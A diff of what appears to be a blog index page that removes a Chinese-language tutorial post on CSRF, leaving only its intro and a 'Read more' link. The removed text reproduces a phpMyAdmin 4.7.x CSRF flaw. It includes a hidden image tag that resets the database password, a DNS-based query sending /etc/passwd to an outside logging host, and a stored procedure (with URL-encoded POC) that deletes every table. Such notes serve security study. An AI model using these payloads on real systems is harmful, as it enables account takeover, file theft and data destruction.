@@ -660,26 +660,16 @@
 
       
         
+          <p>CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。<br>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p>
+          <!--noindex-->
           
-            <p>CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。<br>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p>
-<h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><p>1.正常用户需要登录站点<br>2.攻击者需要知道站点请求内容(构造恶意请求)<br>3.需要正常用户在登录成功的浏览器中诱导点击恶意链接<br>4.服务器无验证或验证不严谨</p>
-<h1 id="自动提交"><a href="#自动提交" class="headerlink" title="自动提交"></a>自动提交</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(&quot;document.form.submit&quot;,1000)</span><br><span class="line">编写脚本，包含document.form.submit</span><br></pre></td></tr></table></figure>
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>phpmyadmin 4.7.x CSRF漏洞</p>
-<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set password=password(&apos;&apos;)</span><br><span class="line">http://192.168.11.200/phpMyAdmin-4.7.4/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password%20=%20PASSWORD(%27123%27)</span><br><span class="line">&lt;p&gt;hello world&lt;/p&gt;</span><br><span class="line">&lt;img src=&quot;http://192.168.11.200/phpMyAdmin-4.7.4/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password%20=%20PASSWORD(%27123%27)&quot; style=&quot;display: none;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure_file_priv%&apos;;</span><br><span class="line">select &quot;&quot; into outfile &apos;/var/&apos;;</span><br></pre></td></tr></table></figure>
-<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file();</span><br><span class="line">select load_file(concat(&apos;\\\\&apos;,(select load_file(&apos;/etc/passwd&apos;)),&apos;.mysql.jjj.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure>
-<p>需要使用OOB</p>
-<h2 id="删库"><a href="#删库" class="headerlink" title="删库"></a>删库</h2><p>完整SQL语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE IF EXISTS EMPT;DELIMITER $$</span><br><span class="line">    CREATE PROCEDURE EMPT()    BEGIN        DECLARE i INT;        SET i = 0;</span><br><span class="line">        WHILE i &lt; 100 DO            SET @del = (SELECT CONCAT(&apos;DELETE FROM &apos;,TABLE_SCHEMA,&apos;.&apos;,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE &apos;%_schema&apos; and TABLE_SCHEMA!=&apos;mysql&apos; LIMIT i,1);</span><br><span class="line">            PREPARE STMT FROM @del;</span><br><span class="line">            EXECUTE STMT;</span><br><span class="line">            SET i = i +1;</span><br><span class="line">        END WHILE;</span><br><span class="line">    END $$</span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CALL EMPT();</span><br></pre></td></tr></table></figure>
-<p>POC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A</span><br></pre></td></tr></table></figure>
-<h1 id="CSRF高危触发点"><a href="#CSRF高危触发点" class="headerlink" title="CSRF高危触发点"></a>CSRF高危触发点</h1><p>论坛交流<br>用户中心<br>反馈留言<br>交易管理<br>后台管理</p>
-<h1 id="CSRF漏洞危害"><a href="#CSRF漏洞危害" class="headerlink" title="CSRF漏洞危害"></a>CSRF漏洞危害</h1><p>CSRF漏洞会导致受害人在不知情的情况下向论坛发帖子、订阅邮件列表、网购或股票交易，或变更用户名或口令。对受到防火墙保护的所有web应用程序而言，CSRF攻击都能绕过防火墙攻击web应用。<br>CSRF漏洞还可以和XSS等漏洞结合使用，从而进一步加大了该漏洞的危害。<br>CSRF+XXE<br>CSRF+LFI<br>CSRF+XSS</p>
-<h3 id="伪造HTTP请求进行未授权操作"><a href="#伪造HTTP请求进行未授权操作" class="headerlink" title="伪造HTTP请求进行未授权操作"></a>伪造HTTP请求进行未授权操作</h3><p>篡改、盗取目标网站上的重要用户数据<br>未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等<br>如果通过使用社工等方式攻击网站管理员，会危害网站本身的安全性</p>
-<p>作为其他攻击向量的辅助攻击手法，比如配合XSS</p>
-<p>传播CSRF蠕虫</p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/05/09/CSRF/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
